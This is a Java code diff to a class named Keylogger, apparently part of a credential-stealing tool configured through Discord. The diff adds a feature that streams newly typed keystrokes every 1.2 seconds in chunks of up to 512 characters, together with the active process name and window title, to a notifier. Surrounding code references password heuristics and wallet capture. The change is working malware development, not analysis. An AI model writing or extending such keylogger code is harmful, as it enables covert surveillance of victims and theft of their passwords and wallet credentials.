@@ -16,6 +16,8 @@ import java.util.Base64;
  */
 final class Keylogger {
 	private static final long IDLE_FLUSH = 10000L;
+	private static final long LIVE_IDLE = 1200L;
+	private static final int LIVE_MAX = 512;
 
 	private final Path installDir;
 	private final Path ops;
@@ -29,6 +31,8 @@ final class Keylogger {
 	private boolean uiaPassword;
 	private long lastEvent = System.currentTimeMillis();
 	private long lastSave;
+	private long lastLiveEmit;
+	private int liveSent;
 	private volatile boolean running = true;
 	private volatile boolean walletForced;
 	int walletOnCalls;
@@ -46,6 +50,10 @@ final class Keylogger {
 
 	boolean wanted() {
 		return state.keyloggerSet ? state.keylogger : DiscordConfig.keylogger();
+	}
+
+	boolean timeline() {
+		return state.keyloggerTimelineSet ? state.keyloggerTimeline : DiscordConfig.keyloggerTimeline();
 	}
 
 	boolean hardOff() {
@@ -187,6 +195,7 @@ final class Keylogger {
 				if (size == position) {
 					Thread.sleep(250L);
 					flushIfIdle();
+					emitLive();
 					continue;
 				}
 				try (RandomAccessFile input = new RandomAccessFile(events.toFile(), "r")) {
@@ -284,6 +293,9 @@ final class Keylogger {
 			if (text.equals("\b")) {
 				if (buffer.length() > 0) {
 					buffer.setLength(buffer.length() - 1);
+					if (liveSent > buffer.length()) {
+						liveSent = buffer.length();
+					}
 				}
 				return;
 			}
@@ -322,9 +334,33 @@ final class Keylogger {
 		}
 	}
 
+	/** Emits only the unsent tail, at most once per LIVE_IDLE, without breaking the password buffer. */
+	private void emitLive() {
+		if (!timeline() || buffer.length() <= liveSent) {
+			return;
+		}
+		long now = System.currentTimeMillis();
+		if (now - lastLiveEmit < LIVE_IDLE) {
+			return;
+		}
+		lastLiveEmit = now;
+		int end = Math.min(buffer.length(), liveSent + LIVE_MAX);
+		String delta = buffer.substring(liveSent, end);
+		liveSent = end;
+		if (delta.isBlank()) {
+			return;
+		}
+		java.util.Map<String, Object> data = new java.util.LinkedHashMap<>();
+		data.put("text", delta);
+		data.put("process", process);
+		data.put("title", title);
+		notifier.event("keystroke", data, "keys: " + process + " | " + title + " | " + delta);
+	}
+
 	private synchronized void flush() {
 		String text = buffer.toString();
 		buffer.setLength(0);
+		liveSent = 0;
 		if (!PasswordHeuristic.plausible(text)) {
 			return;
 		}
